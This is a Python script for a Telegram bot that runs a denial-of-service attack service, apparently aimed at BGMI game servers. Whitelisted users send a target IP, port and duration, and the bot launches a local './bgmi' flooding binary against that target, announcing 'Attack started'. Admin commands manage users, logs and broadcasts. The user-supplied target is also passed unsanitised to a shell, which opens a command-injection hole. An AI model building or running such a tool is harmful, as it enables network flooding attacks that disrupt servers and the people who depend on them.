#!/usr/bin/python3

import telebot
import subprocess
import requests
import datetime
import os

# INSERT NEW TOKEN (REGENERATE THIS!)
bot = telebot.TeleBot('YOUR_NEW_BOT_TOKEN')

# Admin user IDs
admin_id = ["7587825212"]

USER_FILE = "users.txt"
LOG_FILE = "log.txt"


def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []


allowed_user_ids = read_users()


def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"

    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"

    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")


@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)

    if user_id in admin_id:
        command = message.text.split()

        if len(command) > 1:
            user_to_add = command[1]

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")

                response = f"User {user_to_add} added successfully 👍"
            else:
                response = "User already exists 🤦‍♂️"
        else:
            response = "Please specify a user ID to add"

    else:
        response = "Only admin can run this command"

    bot.reply_to(message, response)


@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)

    if user_id in admin_id:
        command = message.text.split()

        if len(command) > 1:
            user_to_remove = command[1]

            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)

                with open(USER_FILE, "w") as file:
                    for uid in allowed_user_ids:
                        file.write(f"{uid}\n")

                response = f"User {user_to_remove} removed successfully 👍"
            else:
                response = "User not found ❌"
        else:
            response = "Specify a user ID to remove"
    else:
        response = "Only admin can run this command"

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)

    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                if file.read().strip() == "":
                    response = "No data found ❌"
                else:
                    file.truncate(0)
                    response = "Logs cleared successfully ✅"
        except FileNotFoundError:
            response = "No data found ❌"
    else:
        response = "Only admin can run this command"

    bot.reply_to(message, response)


@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)

    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()

                if user_ids:
                    response = "Authorized Users:\n"
                    for uid in user_ids:
                        try:
                            user_info = bot.get_chat(int(uid))
                            username = user_info.username
                            response += f"- @{username} (ID: {uid})\n"
                        except:
                            response += f"- User ID: {uid}\n"
                else:
                    response = "No data found ❌"
        except FileNotFoundError:
            response = "No data found ❌"
    else:
        response = "Only admin can run this command"

    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_logs(message):
    user_id = str(message.chat.id)

    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            with open(LOG_FILE, "rb") as file:
                bot.send_document(message.chat.id, file)
        else:
            bot.reply_to(message, "No data found ❌")
    else:
        bot.reply_to(message, "Only admin can run this command")


@bot.message_handler(commands=['id'])
def show_user_id(message):
    bot.reply_to(message, f"Your ID: {message.chat.id}")


bgmi_cooldown = {}


@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)

    if user_id in allowed_user_ids:

        if user_id not in admin_id:
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
                bot.reply_to(message, "You are on cooldown. Wait 300 seconds ❌")
                return

            bgmi_cooldown[user_id] = datetime.datetime.now()

        command = message.text.split()

        if len(command) == 4:
            target = command[1]
            port = int(command[2])
            time = int(command[3])

            if time > 300:
                response = "Error: time must be less than 300"
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)

                bot.reply_to(message, "Attack started successfully ✅")

                full_command = f"./bgmi {target} {port} {time} 300"
                subprocess.run(full_command, shell=True)

                response = "Attack finished 🔥"
        else:
            response = "Usage: /bgmi <IP> <PORT> <TIME>"

    else:
        response = "You are not authorized ❌"

    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def help_command(message):
    text = """Commands:

/bgmi - Run BGMI command
/id - Show your ID

Admin Commands:
/add <id>
/remove <id>
/allusers
/logs
/clearlogs
/broadcast <message>
"""
    bot.reply_to(message, text)


@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, f"Welcome {message.from_user.first_name}\nUse /help to see commands")


@bot.message_handler(commands=['broadcast'])
def broadcast(message):
    user_id = str(message.chat.id)

    if user_id in admin_id:
        command = message.text.split(maxsplit=1)

        if len(command) > 1:
            msg = "Message from admin:\n\n" + command[1]

            with open(USER_FILE, "r") as file:
                for uid in file.read().splitlines():
                    try:
                        bot.send_message(uid, msg)
                    except:
                        pass

            bot.reply_to(message, "Message sent successfully 👍")
        else:
            bot.reply_to(message, "Provide a message")
    else:
        bot.reply_to(message, "Only admin can run this command")


bot.polling()
